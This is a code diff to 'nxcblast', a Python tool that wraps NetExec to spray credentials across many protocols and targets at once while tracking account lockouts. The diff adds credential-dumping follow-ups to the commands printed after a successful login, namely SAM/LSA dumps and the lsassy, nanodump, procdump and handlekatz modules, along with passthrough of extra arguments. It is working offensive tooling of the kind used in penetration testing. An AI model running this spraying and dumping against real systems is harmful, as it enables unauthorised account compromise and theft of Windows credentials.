@@ -56,8 +56,11 @@ PWN3D_MEANING = {
 
 DEFAULT_LOCKOUT = 3
 DEFAULT_LOCKOUT_DELAY = 60
-# 0 = one worker per (protocol, target) lane -- all services on all boxes at once.
-DEFAULT_THREADS = 0
+# Concurrent protocol×target lanes. 0 = one worker per lane (all at once).
+DEFAULT_THREADS = 6
+
+SMB_DUMP_MODULES = ("lsassy", "nanodump", "procdump", "handlekatz")
+AUTH_MODE_ORDER = ["domain", "windows", "local", "mssql", "internal", ""]
 
 ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\][^\x07]*\x07|\x1b\([AB0]")
 HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")
@@ -908,7 +911,6 @@ class LockoutTracker:
         self.pause_active = threading.Event()
         self.pause_skip = threading.Event()
         self.pause_target: Optional[str] = None
-        self._print_lock = threading.Lock()
 
     def key_lock(self, key: tuple[str, str]) -> threading.Lock:
         with self._lock:
@@ -930,21 +932,16 @@ class LockoutTracker:
 
     def abort_target(self, target: str, reason: str) -> None:
         self.aborted_targets.add(target)
-        with self._print_lock:
-            _clear_progress()
-            print(c_warn(f"ABORT TARGET: {target} | {reason}"))
+        emit(c_warn(f"ABORT TARGET: {target} | {reason}"))
 
     def mark_locked_out(self, target: str, cred: Credential) -> None:
         key = self.domain_key(target, cred)
         self.locked_out.add(key)
-        with self._print_lock:
-            _clear_progress()
-            user = cred.display
-            print(
-                c_warn(
-                    f"ACCOUNT LOCKED: {target} | {user} | STATUS_ACCOUNT_LOCKED_OUT"
-                )
+        emit(
+            c_warn(
+                f"ACCOUNT LOCKED: {target} | {cred.display} | STATUS_ACCOUNT_LOCKED_OUT"
             )
+        )
 
     def enter(self, target: str, cred: Credential) -> bool:
         """Reserve this unique cred for (target, domain). Does not hold a lock during nxc.
@@ -1013,9 +1010,7 @@ class LockoutTracker:
             return False
         if skipped or target in self.aborted_targets:
             self.aborted_targets.add(target)
-            with self._print_lock:
-                _clear_progress()
-                print(c_warn(f"Skipping remaining attempts on {target}"))
+            emit(c_warn(f"Skipping remaining attempts on {target}"))
             return False
         return True
 
@@ -1026,6 +1021,7 @@ class LockoutTracker:
 
 _progress_lock = threading.Lock()
 _progress_len = 0
+_dots_on_line = False
 _quiet = False
 _log_fh: Optional[TextIO] = None
 _log_lock = threading.Lock()
@@ -1040,32 +1036,31 @@ def _clear_progress() -> None:
     _progress_len = 0
 
 
-def _progress_bar(done: int, total: int, width: int = 16) -> str:
-    if total <= 0:
-        frac = 1.0
-    else:
-        frac = min(max(done / total, 0.0), 1.0)
-    filled = int(width * frac)
-    if filled > width:
-        filled = width
-    return "[" + "#" * filled + "-" * (width - filled) + "]"
+def _break_dot_line() -> None:
+    """End the current `.` attempt line. Caller must hold `_progress_lock`."""
+    global _dots_on_line
+    if _dots_on_line:
+        sys.stdout.write("\n")
+        sys.stdout.flush()
+        _dots_on_line = False
 
 
-def show_progress(msg: str) -> None:
-    global _progress_len
-    if _quiet or not sys.stderr.isatty():
+def mark_attempt_done() -> None:
+    """Print a `.` for a finished nxc call. Stays on one line until a hit/status."""
+    global _dots_on_line
+    if _quiet:
         return
     with _progress_lock:
-        text = f"{C.dim}[*] {msg}{C.reset}"
-        pad = max(0, _progress_len - len(strip_ansi(text)))
-        sys.stderr.write("\r" + text + (" " * pad))
-        sys.stderr.flush()
-        _progress_len = len(strip_ansi(text))
+        _clear_progress()
+        sys.stdout.write(".")
+        sys.stdout.flush()
+        _dots_on_line = True
 
 
 def emit(msg: str) -> None:
     with _progress_lock:
         _clear_progress()
+        _break_dot_line()
         print(msg, flush=True)
 
 
@@ -1108,9 +1103,30 @@ def find_nxc() -> str:
     raise SystemExit(1)  # unreachable, keeps type checkers happy
 
 
+def split_nxc_passthrough(argv: list[str]) -> tuple[list[str], list[str]]:
+    """Split `nxcblast ... -- extra` so extra is appended to every nxc call."""
+    if "--" not in argv:
+        return argv, []
+    i = argv.index("--")
+    return argv[:i], argv[i + 1 :]
+
+
+def nxc_passthrough(args: argparse.Namespace) -> list[str]:
+    """Flags forwarded to every nxc subprocess: --verbose/--debug plus `--` extras."""
+    flags: list[str] = []
+    if getattr(args, "debug", False):
+        flags.append("--debug")
+    elif getattr(args, "verbose", False):
+        flags.append("--verbose")
+    extra = getattr(args, "nxc_extra", None) or []
+    flags.extend(extra)
+    return flags
+
+
 def build_nxc_argv(
     nxc: str,
     job: Job,
+    passthrough: Optional[list[str]] = None,
 ) -> list[str]:
     cred = job.cred
     argv = [nxc, job.protocol, job.target]
@@ -1126,6 +1142,8 @@ def build_nxc_argv(
         argv += ["-d", cred.domain]
 
     argv.extend(job.extra_args)
+    if passthrough:
+        argv.extend(passthrough)
     return argv
 
 
@@ -1250,7 +1268,9 @@ def pastables_for_hit(hit: Hit) -> list[str]:
         )
         if can_exec:
             spec, extra = _impacket_spec(cred, t, local)
-            lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--sam"))
+            lines.append(_nxc_cmd("smb", t, nxc_auth, local, "--sam --lsa"))
+            for mod in SMB_DUMP_MODULES:
+                lines.append(_nxc_cmd("smb", t, nxc_auth, local, f"-M {mod}"))
             lines.append(_nxc_cmd("smb", t, nxc_auth, local, "-x whoami"))
             lines.append(f"impacket-smbexec {spec}{extra}")
     elif proto == "winrm":
@@ -1307,44 +1327,54 @@ def pastables_for_hit(hit: Hit) -> list[str]:
     return uniq
 
 
+def target_sort_key(target: str) -> tuple:
+    """Sort IPs numerically, then hostnames."""
+    try:
+        ip = ipaddress.ip_address(target)
+        return (0, ip.version, int(ip), target)
+    except ValueError:
+        return (1, 0, 0, target.lower())
+
+
+def proto_sort_key(proto: str) -> tuple[int, str]:
+    try:
+        return (PROTOCOLS.index(proto), proto)
+    except ValueError:
+        return (len(PROTOCOLS), proto)
+
+
+def auth_mode_sort_key(mode: str) -> tuple[int, str]:
+    mode = mode or ""
+    try:
+        return (AUTH_MODE_ORDER.index(mode), mode)
+    except ValueError:
+        return (len(AUTH_MODE_ORDER), mode)
+
+
 def render_pastables(hits: list[Hit]) -> str:
     if not hits:
         return ""
     bar = "=" * 60
 
-    groups: dict[tuple[str, str], list[Hit]] = {}
-    order: list[tuple[str, str]] = []
+    by_target: dict[str, list[Hit]] = {}
     for hit in hits:
-        key = (hit.target, hit.cred.display)
-        if key not in groups:
-            groups[key] = []
-            order.append(key)
-        groups[key].append(hit)
+        by_target.setdefault(hit.target, []).append(hit)
 
     blocks: list[str] = []
-    for key in order:
-        group = groups[key]
-        target, cred_disp = key
+    for target in sorted(by_target, key=target_sort_key):
+        group = by_target[target]
         host = next((h.hostname for h in group if h.hostname), "")
         target_label = f"{target} ({host})" if host else target
         body: list[str] = []
         by_proto: dict[str, list[Hit]] = {}
-        proto_order: list[str] = []
         for hit in group:
-            if hit.protocol not in by_proto:
-                by_proto[hit.protocol] = []
-                proto_order.append(hit.protocol)
-            by_proto[hit.protocol].append(hit)
-        for proto in proto_order:
+            by_proto.setdefault(hit.protocol, []).append(hit)
+        for proto in sorted(by_proto, key=proto_sort_key):
             mode_groups: dict[str, list[Hit]] = {}
-            mode_order: list[str] = []
             for hit in by_proto[proto]:
                 mode = hit.auth_mode or ""
-                if mode not in mode_groups:
-                    mode_groups[mode] = []
-                    mode_order.append(mode)
-                mode_groups[mode].append(hit)
-            for mode in mode_order:
+                mode_groups.setdefault(mode, []).append(hit)
+            for mode in sorted(mode_groups, key=auth_mode_sort_key):
                 seen_cmd: set[str] = set()
                 cmds: list[str] = []
                 for hit in mode_groups[mode]:
@@ -1355,13 +1385,13 @@ def render_pastables(hits: list[Hit]) -> str:
                 if not cmds:
                     continue
                 title = f"[{proto.upper()} {mode}]" if mode else f"[{proto.upper()}]"
-                body.append(title)
+                body.append(f"    {title}")
                 for cmd in cmds:
-                    body.append(f"  {cmd}")
+                    body.append(f"      {cmd}")
                 body.append("")
         if not body:
             continue
-        blocks.append(f"[{target_label} | {cred_disp}]")
+        blocks.append(f"[{target_label}]")
         blocks.append("")
         blocks.extend(body)
     if not blocks:
@@ -1548,15 +1578,21 @@ examples:
   nxcblast mssql 10.10.10.20 -u sa -p sa --mssql-local
   nxcblast smb 10.10.10.5 -u admin -p Password1 --local --stop-on-hit
   nxcblast targets.txt -u admin --user-only --null --guest --threads 8
+  nxcblast smb targets.txt -u admin -p Password1 --verbose
+  nxcblast smb targets.txt -u admin -p Password1 -- --users bob
 
 Inspired by nxcspray (https://github.com/NTHSec/nxcspray).
+
+Big kudos to NetExec (https://github.com/Pennyw0rth/NetExec) and CrackMapExec
+(https://github.com/byt3bl33d3r/CrackMapExec) -- the original projects this
+stands on.
 """
 
 
 def build_parser() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(
         prog="nxcblast",
-        usage="nxcblast [protocols] [targets] [auth] [options]",
+        usage="nxcblast [protocols] [targets] [auth] [options] [-- nxc-args]",
         description=(
             "Spray credentials across every NetExec protocol at once -- "
             "hits only, lockout-aware, pastables on finish."
@@ -1689,7 +1725,7 @@ def build_parser() -> argparse.ArgumentParser:
         type=int,
         default=DEFAULT_THREADS,
         help=(
-            "max concurrent protocol×target lanes (default: 0 = all services "
+            "max concurrent protocol×target lanes (default: 6; 0 = all services "
             "against all targets at once; each lane still runs one cred at a time)"
         ),
     )
@@ -1706,7 +1742,18 @@ def build_parser() -> argparse.ArgumentParser:
     out.add_argument(
         "--quiet",
         action="store_true",
-        help="suppress progress indicator, show only hits",
+        help="suppress progress dots, show only hits",
+    )
+    log_level = out.add_mutually_exclusive_group()
+    log_level.add_argument(
+        "--verbose",
+        action="store_true",
+        help="pass --verbose through to each nxc call (nxc verbose output goes to the log)",
+    )
+    log_level.add_argument(
+        "--debug",
+        action="store_true",
+        help="pass --debug through to each nxc call (nxc debug output goes to the log)",
     )
     return p
 
@@ -1800,25 +1847,13 @@ def run_spray(
     """
     hits: list[Hit] = []
     hits_lock = threading.Lock()
-    done = 0
-    done_lock = threading.Lock()
-    total = len(jobs)
     limiter = RateLimiter(args.delay)
+    extra_nxc = nxc_passthrough(args)
     lanes = group_jobs_by_lane(jobs)
     if args.threads <= 0:
         workers = max(1, len(lanes))
     else:
         workers = max(1, min(args.threads, len(lanes) or 1))
-
-    def bump_progress(job: Job) -> None:
-        nonlocal done
-        with done_lock:
-            done += 1
-            combo = job.combo_label()
-            show_progress(
-                f"{_progress_bar(done, total)} {done}/{total} | "
-                f"{combo} | {job.target} | {job.cred.display}"
-            )
 
     def run_one(job: Job) -> list[Hit]:
         if lockout.shutdown.is_set():
@@ -1831,15 +1866,9 @@ def run_spray(
             if lockout.shutdown.is_set():
                 return []
             limiter.wait()
-            argv = build_nxc_argv(nxc, job)
-            combo = job.combo_label()
-            with done_lock:
-                current = done + 1
-            show_progress(
-                f"{_progress_bar(current, total)} {current}/{total} | "
-                f"{combo} | {job.target} | {job.cred.display}"
-            )
+            argv = build_nxc_argv(nxc, job, extra_nxc)
             stdout = run_nxc(argv)
+            mark_attempt_done()
             log_write(
                 "\n"
                 + "=" * 70
@@ -1864,15 +1893,13 @@ def run_spray(
             lockout.leave(job.target, job.cred)
 
     def run_lane(lane_jobs: list[Job]) -> None:
-        for i, job in enumerate(lane_jobs):
+        for job in lane_jobs:
             if lockout.shutdown.is_set():
-                bump_progress(job)
                 continue
             try:
                 found = run_one(job)
             except Exception as exc:
                 log_write(f"{utc_now()} | worker error: {exc}\n")
-                bump_progress(job)
                 continue
             if found:
                 with hits_lock:
@@ -1880,11 +1907,7 @@ def run_spray(
                 for hit in found:
                     emit(format_hit_line(hit))
                 if args.stop_on_hit:
-                    bump_progress(job)
-                    for skipped in lane_jobs[i + 1 :]:
-                        bump_progress(skipped)
                     return
-            bump_progress(job)
 
     with ThreadPoolExecutor(max_workers=workers) as pool:
         futures = [pool.submit(run_lane, lane_jobs) for _, lane_jobs in lanes]
@@ -1925,13 +1948,17 @@ def install_sigint(lockout: LockoutTracker) -> Callable:
 
 
 def main(argv: Optional[list[str]] = None) -> int:
-    global _quiet, _log_fh
+    global _quiet, _log_fh, _dots_on_line
+
+    raw_argv = list(argv) if argv is not None else sys.argv[1:]
+    parse_argv, nxc_extra = split_nxc_passthrough(raw_argv)
 
     parser = build_parser()
-    args = parser.parse_args(argv)
+    args = parser.parse_args(parse_argv)
+    args.nxc_extra = nxc_extra
 
-    if args.quiet:
-        _quiet = True
+    _quiet = bool(args.quiet)
+    _dots_on_line = False
 
     apply_default_auth(args)
 
@@ -1979,7 +2006,9 @@ def main(argv: Optional[list[str]] = None) -> int:
         except OSError as exc:
             die(f"cannot open log file {log_path}: {exc}")
         log_write(f"# nxcblast log started {utc_now()}\n")
-        log_write(f"# argv: {argv_to_str([sys.argv[0]] + (argv if argv is not None else sys.argv[1:]))}\n")
+        log_write(f"# argv: {argv_to_str([sys.argv[0]] + raw_argv)}\n")
+        if nxc_extra:
+            log_write(f"# nxc extra: {argv_to_str(nxc_extra)}\n")
 
     emit(
         c_info(
@@ -1989,6 +2018,13 @@ def main(argv: Optional[list[str]] = None) -> int:
     )
     if log_path:
         emit(c_info(f"Verbose log: {log_path}"))
+    if nxc_extra:
+        emit(
+            c_warn(
+                "experimental: appending extra args to every nxc call: "
+                + argv_to_str(nxc_extra)
+            )
+        )
     emit(
         c_info(
             "Ctrl+C skips this target during a pause; "
@@ -2010,10 +2046,19 @@ def main(argv: Optional[list[str]] = None) -> int:
         emit(c_warn("Interrupted"))
     finally:
         signal.signal(signal.SIGINT, prev_handler)
-        _clear_progress()
+        with _progress_lock:
+            _clear_progress()
+            _break_dot_line()
 
+    hits.sort(
+        key=lambda h: (
+            target_sort_key(h.target),
+            proto_sort_key(h.protocol),
+            auth_mode_sort_key(h.auth_mode),
+            h.cred.display,
+        )
+    )
     unique_targets = {h.target for h in hits}
-    print(flush=True)
     emit(
         c_info(
             f"Done. {len(hits)} hit{'s' if len(hits) != 1 else ''} "
